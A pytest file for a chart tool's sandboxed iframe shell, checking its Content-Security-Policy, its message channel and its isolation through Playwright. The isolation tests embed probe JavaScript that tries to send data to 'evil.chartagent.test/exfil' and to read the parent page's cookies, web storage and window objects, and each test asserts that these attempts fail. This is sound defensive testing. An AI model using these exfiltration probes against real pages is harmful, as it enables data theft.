"""``build_shell`` — the from-scratch iframe shell (ADR-0017, #208).

Pure-Python tests cover the return value: determinism, the frozen
``Shell``, its sandbox tokens, and every ``DocumentAssemblyError`` kind
this slice raises. The real-browser tests mount the shell in a sandboxed
iframe exactly as Studio will — real Chromium via Playwright, no CDN, no
stand-in — and are skipped when no Chromium is installed, the same posture
``test_rasterise.py`` takes (#201).

CSS-scoping
adversarial cases (#211), pinned-library load order at scale (#212), size
caps (#213) and safe embedding of adversarial ``</script>``/``<!--`` text
(#214) are later tickets'.
"""

from __future__ import annotations

import dataclasses
import hashlib
import html
import inspect
from collections.abc import Iterator

import pyarrow as pa
import pytest

from chartagent import BoundDocument, DocumentAssemblyError, Shell, build_shell
from chartagent.errors import ChartAgentError
from chartagent.recipe import ChartDocument, LibraryPin
from chartagent.transform.serialize import serialize_rows


def _playwright_chromium_available() -> bool:
    try:
        from playwright.sync_api import sync_playwright
    except ModuleNotFoundError:
        return False
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch()
            browser.close()
    except Exception:
        return False
    return True


pytestmark_live = pytest.mark.skipif(
    not _playwright_chromium_available(), reason="no Chromium install available"
)

_RENDER_MODULE = """
window.__paintCount = 0;
function render(data, el) {
  window.__paintCount = (window.__paintCount || 0) + 1;
  el.textContent = JSON.stringify(data);
}
function getPlottedSeries() {
  return [{ series: "s", x: "a", y: 1 }];
}
"""

# No top-level `render` at all (#209 AC1).
_MISSING_RENDER_MODULE = """
function getPlottedSeries() {
  return [{ series: "s", x: "a", y: 1 }];
}
"""

# `render` throws on its first call, then paints cleanly (#209 AC2 and AC4:
# the same shell instance recovers without being remounted).
_FLAKY_RENDER_MODULE = """
window.__callCount = 0;
function render(data, el) {
  window.__callCount = (window.__callCount || 0) + 1;
  if (window.__callCount === 1) {
    throw new Error("boom");
  }
  el.textContent = JSON.stringify(data);
}
function getPlottedSeries() {
  return [{ series: "s", x: "a", y: window.__callCount }];
}
"""

# `render` always succeeds; `getPlottedSeries` throws on its first call, then
# answers cleanly (#209 AC3 and AC4).
_FLAKY_GET_PLOTTED_SERIES_MODULE = """
window.__paintCount = 0;
function render(data, el) {
  window.__paintCount = (window.__paintCount || 0) + 1;
  el.textContent = JSON.stringify(data);
}
function getPlottedSeries() {
  if (window.__paintCount === 1) {
    throw new Error("boom");
  }
  return [{ series: "s", x: "a", y: window.__paintCount }];
}
"""


def _from_scratch_document(
    module: str = _RENDER_MODULE, styles: str | None = None
) -> ChartDocument:
    return ChartDocument(module=module, styles=styles, libraries=())


# --- Pure-Python: the return value --------------------------------------


def test_build_shell_takes_no_rows() -> None:
    params = list(inspect.signature(build_shell).parameters)
    assert params == ["document", "libraries"]


def test_shell_is_frozen() -> None:
    shell = build_shell(_from_scratch_document(), libraries={})
    assert isinstance(shell, Shell)
    with pytest.raises(dataclasses.FrozenInstanceError):
        shell.html = "tampered"  # type: ignore[misc]


def test_sandbox_tokens_are_exactly_allow_scripts() -> None:
    shell = build_shell(_from_scratch_document(), libraries={})
    assert shell.sandbox == ("allow-scripts",)
    assert "allow-same-origin" not in shell.sandbox


def test_build_shell_is_deterministic() -> None:
    document = _from_scratch_document()
    first = build_shell(document, libraries={})
    second = build_shell(document, libraries={})
    assert first == second


def test_empty_libraries_map_is_legal_for_a_from_scratch_document() -> None:
    shell = build_shell(_from_scratch_document(), libraries={})
    assert "function render" in shell.html


def test_contract_version_other_than_one_raises_contract_unsupported() -> None:
    document = _from_scratch_document()
    document = dataclasses.replace(document, contract_version=2)
    with pytest.raises(DocumentAssemblyError) as caught:
        build_shell(document, libraries={})
    assert caught.value.kind == "contract_unsupported"
    assert isinstance(caught.value, ChartAgentError)


def test_document_assembly_error_is_raised_only_here() -> None:
    # BoundDocument, the paintable counterpart, is untouched by this slice.
    doc = ChartDocument(module="x", styles=None, libraries=())
    bound = BoundDocument(
        document=doc, rows=pa.table({"x": [1]}), theme={}, libraries={}
    )
    assert bound.document is doc


def test_missing_pin_bytes_raise_pin_missing() -> None:
    pin = LibraryPin(name="chartjs", version="4.0.0", sha256="a" * 64)
    document = ChartDocument(module=_RENDER_MODULE, styles=None, libraries=(pin,))
    with pytest.raises(DocumentAssemblyError) as caught:
        build_shell(document, libraries={})
    assert caught.value.kind == "pin_missing"


def test_mismatched_pin_bytes_raise_pin_mismatch() -> None:
    blob = b"window.ChartLib = {};"
    wrong_sha = hashlib.sha256(b"not the real bytes").hexdigest()
    pin = LibraryPin(name="chartjs", version="4.0.0", sha256=wrong_sha)
    document = ChartDocument(module=_RENDER_MODULE, styles=None, libraries=(pin,))
    with pytest.raises(DocumentAssemblyError) as caught:
        build_shell(document, libraries={wrong_sha: blob})
    assert caught.value.kind == "pin_mismatch"


def test_a_blob_the_document_does_not_pin_is_ignored() -> None:
    document = _from_scratch_document()
    unrelated_sha = hashlib.sha256(b"unrelated").hexdigest()
    shell = build_shell(document, libraries={unrelated_sha: b"window.Unused = 1;"})
    assert "Unused" not in shell.html


def test_csp_allows_scripts_by_hash_only_with_no_unsafe_inline_or_eval() -> None:
    shell = build_shell(_from_scratch_document(), libraries={})
    csp_line = next(
        line for line in shell.html.splitlines() if "Content-Security-Policy" in line
    )
    assert "'unsafe-inline'" not in csp_line.split("script-src", 1)[1].split(";", 1)[0]
    assert "'unsafe-eval'" not in csp_line
    assert "script-src 'sha256-" in csp_line


# --- Real browser: mounting the shell exactly as Studio will -------------


def _iframe_harness(main_shell: Shell) -> str:
    sibling_html = "<!doctype html><html><body>sibling</body></html>"
    return f"""<!doctype html>
<html><body>
<iframe id="main" name="main" sandbox="{" ".join(main_shell.sandbox)}"
  srcdoc="{html.escape(main_shell.html)}"></iframe>
<iframe id="sibling" name="sibling" sandbox="allow-scripts"
  srcdoc="{html.escape(sibling_html)}"></iframe>
<script>
window.__acks = [];
window.addEventListener("message", function (e) {{ window.__acks.push(e.data); }});
</script>
</body></html>"""


def _post_paint(page: object, rows: object) -> None:
    page.evaluate(  # type: ignore[attr-defined]
        """(rows) => {
          window.frames["main"].postMessage(
            { type: "chartagent/paint", contractVersion: 1, rows: rows },
            "*"
          );
        }""",
        rows,
    )


def _capture_page_errors(page: object) -> list[object]:
    # An uncaught exception on the shell's own page would land here — a
    # thrown render/getPlottedSeries must be contained by the bootstrap's
    # own try/catch and never escape to this listener (#209 AC2).
    errors: list[object] = []
    page.on("pageerror", lambda exc: errors.append(exc))  # type: ignore[attr-defined]
    return errors


@pytest.fixture()
def page() -> Iterator[object]:
    from playwright.sync_api import sync_playwright

    with sync_playwright() as p:
        browser = p.chromium.launch()
        pw_page = browser.new_page()
        yield pw_page
        browser.close()


@pytestmark_live
def test_from_scratch_document_paints_and_reports_true_with_declaration(
    page: object,
) -> None:
    shell = build_shell(_from_scratch_document(), libraries={})
    page.set_content(_iframe_harness(shell))  # type: ignore[attr-defined]
    page.wait_for_timeout(100)  # type: ignore[attr-defined]

    # The channel carries the JSON serialiser's output, not a hand-built
    # JSON string (ADR-0017 Decision 9; #208 AC1) — this is the seam's
    # first caller, and Studio is the second.
    rows, _ = serialize_rows(pa.table({"a": [1]}), {"a": "BIGINT"})
    _post_paint(page, rows)
    page.wait_for_function("() => window.__acks.length > 0")  # type: ignore[attr-defined]
    acks = page.evaluate("() => window.__acks")  # type: ignore[attr-defined]

    assert len(acks) == 1
    assert acks[0]["ok"] is True
    assert acks[0]["plottedSeries"] == [{"series": "s", "x": "a", "y": 1}]

    main = page.frame(name="main")  # type: ignore[attr-defined]
    assert main.evaluate("() => window.__paintCount") == 1
    container_text = main.evaluate(
        "() => document.getElementById('chartagent-container').textContent"
    )
    assert container_text == '[{"a":1}]'


@pytestmark_live
def test_a_re_read_without_a_redraw_returns_the_last_declaration(page: object) -> None:
    shell = build_shell(_from_scratch_document(), libraries={})
    page.set_content(_iframe_harness(shell))  # type: ignore[attr-defined]
    page.wait_for_timeout(100)  # type: ignore[attr-defined]

    rows, _ = serialize_rows(pa.table({"a": [1]}), {"a": "BIGINT"})
    _post_paint(page, rows)
    page.wait_for_function("() => window.__acks.length > 0")  # type: ignore[attr-defined]

    # A re-read: no render call, just getPlottedSeries() again.
    page.evaluate(  # type: ignore[attr-defined]
        """() => {
          window.frames["main"].postMessage(
            { type: "chartagent/read", contractVersion: 1 },
            "*"
          );
        }"""
    )
    page.wait_for_function("() => window.__acks.length > 1")  # type: ignore[attr-defined]
    acks = page.evaluate("() => window.__acks")  # type: ignore[attr-defined]

    assert len(acks) == 2
    assert acks[1]["ok"] is True
    assert acks[1]["plottedSeries"] == acks[0]["plottedSeries"]
    main = page.frame(name="main")  # type: ignore[attr-defined]
    # No second render — the container still holds the first paint's text.
    assert main.evaluate("() => window.__paintCount") == 1


@pytestmark_live
def test_missing_render_reports_false(page: object) -> None:
    shell = build_shell(
        _from_scratch_document(module=_MISSING_RENDER_MODULE), libraries={}
    )
    errors = _capture_page_errors(page)
    page.set_content(_iframe_harness(shell))  # type: ignore[attr-defined]
    page.wait_for_timeout(100)  # type: ignore[attr-defined]

    rows, _ = serialize_rows(pa.table({"a": [1]}), {"a": "BIGINT"})
    _post_paint(page, rows)
    page.wait_for_function("() => window.__acks.length > 0")  # type: ignore[attr-defined]
    acks = page.evaluate("() => window.__acks")  # type: ignore[attr-defined]

    assert acks[0]["ok"] is False
    assert acks[0]["plottedSeries"] is None
    assert errors == []


@pytestmark_live
def test_throwing_render_reports_false_and_does_not_break_the_shell_page(
    page: object,
) -> None:
    shell = build_shell(
        _from_scratch_document(module=_FLAKY_RENDER_MODULE), libraries={}
    )
    errors = _capture_page_errors(page)
    page.set_content(_iframe_harness(shell))  # type: ignore[attr-defined]
    page.wait_for_timeout(100)  # type: ignore[attr-defined]

    rows, _ = serialize_rows(pa.table({"a": [1]}), {"a": "BIGINT"})
    _post_paint(page, rows)
    page.wait_for_function("() => window.__acks.length > 0")  # type: ignore[attr-defined]
    acks = page.evaluate("() => window.__acks")  # type: ignore[attr-defined]

    assert acks[0]["ok"] is False
    assert acks[0]["plottedSeries"] is None
    # The throw was caught inside the shell's own bootstrap — it never
    # escaped to become an uncaught exception on the shell's page.
    assert errors == []


@pytestmark_live
def test_throwing_get_plotted_series_after_successful_render_reports_false(
    page: object,
) -> None:
    shell = build_shell(
        _from_scratch_document(module=_FLAKY_GET_PLOTTED_SERIES_MODULE), libraries={}
    )
    errors = _capture_page_errors(page)
    page.set_content(_iframe_harness(shell))  # type: ignore[attr-defined]
    page.wait_for_timeout(100)  # type: ignore[attr-defined]

    rows, _ = serialize_rows(pa.table({"a": [1]}), {"a": "BIGINT"})
    _post_paint(page, rows)
    page.wait_for_function("() => window.__acks.length > 0")  # type: ignore[attr-defined]
    acks = page.evaluate("() => window.__acks")  # type: ignore[attr-defined]

    assert acks[0]["ok"] is False
    assert acks[0]["plottedSeries"] is None
    assert errors == []
    # render itself ran fine before getPlottedSeries blew up.
    main = page.frame(name="main")  # type: ignore[attr-defined]
    assert main.evaluate("() => window.__paintCount") == 1


@pytestmark_live
def test_a_second_good_paint_recovers_after_render_throws(page: object) -> None:
    shell = build_shell(
        _from_scratch_document(module=_FLAKY_RENDER_MODULE), libraries={}
    )
    page.set_content(_iframe_harness(shell))  # type: ignore[attr-defined]
    page.wait_for_timeout(100)  # type: ignore[attr-defined]

    rows, _ = serialize_rows(pa.table({"a": [1]}), {"a": "BIGINT"})
    _post_paint(page, rows)
    page.wait_for_function("() => window.__acks.length > 0")  # type: ignore[attr-defined]
    _post_paint(page, rows)
    page.wait_for_function("() => window.__acks.length > 1")  # type: ignore[attr-defined]
    acks = page.evaluate("() => window.__acks")  # type: ignore[attr-defined]

    assert acks[0]["ok"] is False
    assert acks[1]["ok"] is True
    assert acks[1]["plottedSeries"] == [{"series": "s", "x": "a", "y": 2}]
    main = page.frame(name="main")  # type: ignore[attr-defined]
    container_text = main.evaluate(
        "() => document.getElementById('chartagent-container').textContent"
    )
    assert container_text == '[{"a":1}]'


@pytestmark_live
def test_a_second_good_paint_recovers_after_get_plotted_series_throws(
    page: object,
) -> None:
    shell = build_shell(
        _from_scratch_document(module=_FLAKY_GET_PLOTTED_SERIES_MODULE), libraries={}
    )
    page.set_content(_iframe_harness(shell))  # type: ignore[attr-defined]
    page.wait_for_timeout(100)  # type: ignore[attr-defined]

    rows, _ = serialize_rows(pa.table({"a": [1]}), {"a": "BIGINT"})
    _post_paint(page, rows)
    page.wait_for_function("() => window.__acks.length > 0")  # type: ignore[attr-defined]
    _post_paint(page, rows)
    page.wait_for_function("() => window.__acks.length > 1")  # type: ignore[attr-defined]
    acks = page.evaluate("() => window.__acks")  # type: ignore[attr-defined]

    assert acks[0]["ok"] is False
    assert acks[1]["ok"] is True
    assert acks[1]["plottedSeries"] == [{"series": "s", "x": "a", "y": 2}]


@pytestmark_live
def test_message_from_a_sibling_frame_is_ignored(page: object) -> None:
    shell = build_shell(_from_scratch_document(), libraries={})
    page.set_content(_iframe_harness(shell))  # type: ignore[attr-defined]
    page.wait_for_timeout(100)  # type: ignore[attr-defined]

    sibling = page.frame(name="sibling")  # type: ignore[attr-defined]
    sibling.evaluate(
        """() => {
          window.parent.frames["main"].postMessage(
            {
              type: "chartagent/paint",
              contractVersion: 1,
              rows: [{ malicious: true }],
            },
            "*"
          );
        }"""
    )
    page.wait_for_timeout(200)  # type: ignore[attr-defined]

    main = page.frame(name="main")  # type: ignore[attr-defined]
    assert main.evaluate("() => window.__paintCount") == 0
    assert page.evaluate("() => window.__acks.length") == 0  # type: ignore[attr-defined]


@pytestmark_live
def test_csp_blocks_eval_and_dynamically_injected_scripts(page: object) -> None:
    module = (
        _RENDER_MODULE
        + """
try {
  eval("window.__evalRan = true");
} catch (e) {
  window.__evalBlocked = true;
}
var injected = document.createElement("script");
injected.textContent = "window.__injected = true;";
document.head.appendChild(injected);
"""
    )
    shell = build_shell(_from_scratch_document(module=module), libraries={})
    page.set_content(_iframe_harness(shell))  # type: ignore[attr-defined]
    page.wait_for_timeout(200)  # type: ignore[attr-defined]

    main = page.frame(name="main")  # type: ignore[attr-defined]
    assert main.evaluate("() => window.__evalRan") is None
    assert main.evaluate("() => window.__evalBlocked") is True
    assert main.evaluate("() => window.__injected") is None
    # The hash-allowed module itself still ran fine under the same policy.
    assert main.evaluate("() => typeof window.render") == "function"


# --- Real browser: the sandbox actually isolates (#210) ------------------
#
# The host page is served from a real http origin (routed, no network) so
# it can hold a cookie and localStorage/sessionStorage entries of its own;
# the shell is mounted as a sandboxed srcdoc iframe exactly as Studio will.
# Each probe module records what it observed on `window.__probe`.

_HOST_ORIGIN = "http://host.chartagent.test"
_EVIL_ORIGIN = "http://evil.chartagent.test"
_HOST_SECRET = "host-secret-value"


@dataclasses.dataclass
class _HostPage:
    page: object
    evil_requests: list[str]


@pytest.fixture()
def host() -> Iterator[_HostPage]:
    from playwright.sync_api import sync_playwright

    with sync_playwright() as p:
        browser = p.chromium.launch()
        context = browser.new_context()
        context.add_cookies(
            [{"name": "session", "value": _HOST_SECRET, "url": _HOST_ORIGIN}]
        )
        evil_requests: list[str] = []

        def _route(route: object) -> None:
            url = route.request.url  # type: ignore[attr-defined]
            if url.startswith(_EVIL_ORIGIN):
                evil_requests.append(url)
                route.fulfill(status=200, body="leaked")  # type: ignore[attr-defined]
            else:
                route.fulfill(  # type: ignore[attr-defined]
                    status=200, content_type="text/html", body="<!doctype html>"
                )

        context.route("**/*", _route)
        pw_page = context.new_page()
        pw_page.goto(_HOST_ORIGIN + "/")
        yield _HostPage(page=pw_page, evil_requests=evil_requests)
        browser.close()


def _mount_probe(host: _HostPage, probe_body: str) -> object:
    """Mount a shell whose module runs ``probe_body`` and return its frame."""
    module = (
        _RENDER_MODULE
        + f"""
window.__probe = {{}};
function __attempt(name, fn) {{
  try {{ window.__probe[name] = {{ value: fn() }}; }}
  catch (e) {{ window.__probe[name] = {{ error: e && e.name }}; }}
}}
{probe_body}
"""
    )
    shell = build_shell(_from_scratch_document(module=module), libraries={})
    page = host.page
    page.evaluate(  # type: ignore[attr-defined]
        """(secret) => {
          document.cookie = "docsecret=" + secret;
          localStorage.setItem("token", secret);
          sessionStorage.setItem("token", secret);
          window.__hostSecret = secret;
          window.__acks = [];
          window.addEventListener("message", (e) => window.__acks.push(e.data));
        }""",
        _HOST_SECRET,
    )
    page.evaluate(  # type: ignore[attr-defined]
        """([sandbox, srcdoc]) => {
          const f = document.createElement("iframe");
          f.name = "main";
          f.setAttribute("sandbox", sandbox);
          f.srcdoc = srcdoc;
          document.body.appendChild(f);
        }""",
        [" ".join(shell.sandbox), shell.html],
    )
    frame = None
    for _ in range(50):
        frame = page.frame(name="main")  # type: ignore[attr-defined]
        if frame is not None and frame.evaluate("() => !!window.__probe"):
            break
        page.wait_for_timeout(50)  # type: ignore[attr-defined]
    assert frame is not None
    return frame


@pytestmark_live
def test_module_cannot_reach_the_network_via_fetch_or_xhr(host: _HostPage) -> None:
    url = _EVIL_ORIGIN + "/exfil"
    frame = _mount_probe(
        host,
        f"""
window.__probe.fetch = "pending";
fetch({url!r}).then(
  function () {{ window.__probe.fetch = "resolved"; }},
  function (e) {{ window.__probe.fetch = "rejected"; }}
);
window.__probe.xhr = "pending";
try {{
  var x = new XMLHttpRequest();
  x.open("GET", {url!r});
  x.onload = function () {{ window.__probe.xhr = "loaded"; }};
  x.onerror = function () {{ window.__probe.xhr = "error"; }};
  x.send();
}} catch (e) {{ window.__probe.xhr = "threw"; }}
""",
    )
    host.page.wait_for_timeout(300)  # type: ignore[attr-defined]

    probe = frame.evaluate("() => window.__probe")  # type: ignore[attr-defined]
    assert probe["fetch"] == "rejected"
    assert probe["xhr"] in ("error", "threw")
    assert host.evil_requests == []


@pytestmark_live
def test_module_cannot_reach_the_network_via_beacon_websocket_or_image(
    host: _HostPage,
) -> None:
    url = _EVIL_ORIGIN + "/exfil"
    frame = _mount_probe(
        host,
        f"""
__attempt("beacon", function () {{ return navigator.sendBeacon({url!r}, "x"); }});
__attempt("ws", function () {{ return new WebSocket({url.replace("http", "ws")!r}); }});
var img = new Image();
img.src = {url!r};
""",
    )
    host.page.wait_for_timeout(300)  # type: ignore[attr-defined]

    probe = frame.evaluate("() => window.__probe")  # type: ignore[attr-defined]
    # sendBeacon returns true once queued; the request log is the signal.
    assert "beacon" in probe and "ws" in probe
    assert host.evil_requests == []


@pytestmark_live
def test_module_sees_none_of_the_parents_cookies(host: _HostPage) -> None:
    frame = _mount_probe(
        host, '__attempt("cookie", function () { return document.cookie; });'
    )
    probe = frame.evaluate("() => window.__probe")  # type: ignore[attr-defined]

    # An opaque origin has no cookie jar: reading throws (or, at most,
    # returns nothing) — it never returns the parent's cookie.
    assert probe["cookie"].get("error") == "SecurityError" or not probe["cookie"].get(
        "value"
    )
    assert _HOST_SECRET not in str(probe["cookie"])


@pytestmark_live
def test_module_sees_none_of_the_parents_web_storage(host: _HostPage) -> None:
    frame = _mount_probe(
        host,
        """
__attempt("local", function () { return localStorage.getItem("token"); });
__attempt("session", function () { return sessionStorage.getItem("token"); });
""",
    )
    probe = frame.evaluate("() => window.__probe")  # type: ignore[attr-defined]

    for kind in ("local", "session"):
        assert probe[kind].get("error") == "SecurityError" or not probe[kind].get(
            "value"
        )
    assert _HOST_SECRET not in str(probe)


@pytestmark_live
def test_module_cannot_reach_the_parents_window_objects(host: _HostPage) -> None:
    frame = _mount_probe(
        host,
        """
__attempt("parentDocument", function () { return window.parent.document.title; });
__attempt("parentSecret", function () { return window.parent.__hostSecret; });
__attempt("parentLocation", function () { return window.parent.location.href; });
__attempt("parentStorage", function () {
  return window.parent.localStorage.getItem("token");
});
__attempt("topDocument", function () { return window.top.document.cookie; });
__attempt("frameElement", function () { return window.frameElement; });
__attempt("opener", function () { return window.opener; });
""",
    )
    probe = frame.evaluate("() => window.__probe")  # type: ignore[attr-defined]

    for name in (
        "parentDocument",
        "parentSecret",
        "parentLocation",
        "parentStorage",
        "topDocument",
    ):
        assert probe[name].get("error") == "SecurityError", name
    assert probe["frameElement"]["value"] is None
    assert probe["opener"]["value"] is None
    assert _HOST_SECRET not in str(probe)


@pytestmark_live
def test_the_bootstrap_postmessage_channel_still_works_under_isolation(
    host: _HostPage,
) -> None:
    _mount_probe(host, "")
    rows, _ = serialize_rows(pa.table({"a": [1]}), {"a": "BIGINT"})
    _post_paint(host.page, rows)
    host.page.wait_for_function("() => window.__acks.length > 0")  # type: ignore[attr-defined]
    acks = host.page.evaluate("() => window.__acks")  # type: ignore[attr-defined]

    assert acks[0]["ok"] is True
